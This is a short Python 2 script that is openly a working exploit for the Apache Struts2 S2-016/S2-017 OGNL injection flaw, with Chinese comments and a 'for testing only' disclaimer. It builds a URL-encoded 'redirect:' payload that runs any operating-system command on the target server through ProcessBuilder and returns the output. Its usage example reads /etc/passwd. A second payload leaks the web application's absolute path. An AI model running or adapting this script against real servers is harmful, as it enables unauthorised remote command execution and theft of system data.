#-*- coding:utf8 -*-
#Structs2 S2-016、017 Exploit By Kenny @ 2013.7.17
#僅供測試，若有任何損害概不負責

import urllib2,getopt,sys
import re 

def info():
  print 'python Structs2_S-17.py -u http://test.com/test.action -d "cat /etc/passwd"'
def Exploit(url, data):
	string = url + "?" + data
	req = urllib2.Request(string)
	response = urllib2.urlopen(req)
	#過濾異常字元
	Result = re.compile('[\\x00-\\x08\\x0b-\\x0c\\x0e-\\x1f]').sub('', response.read())
	print Result

if __name__ == '__main__' :
	try:
		opts, args = getopt.getopt(sys.argv[1:],"u:d:p")
	except:
		info()
		sys.exit(2)
	for opt, value in opts:
		if opt == '-u':
			url = value
		#命令執行
		elif opt == '-d':
			Command = value
			InputCommand = ""
			for x in Command.split(' '):
				InputCommand += '\'%s\',' % x
			Payload = 'redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{'
			Payload += InputCommand.rstrip(',')
			Payload +='}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}'
			Exploit(url,Payload)
		#網站絕對路徑
		if opt == '-p':
			Payload = 'redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28"%2F"%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D'
			Exploit(url,Payload)
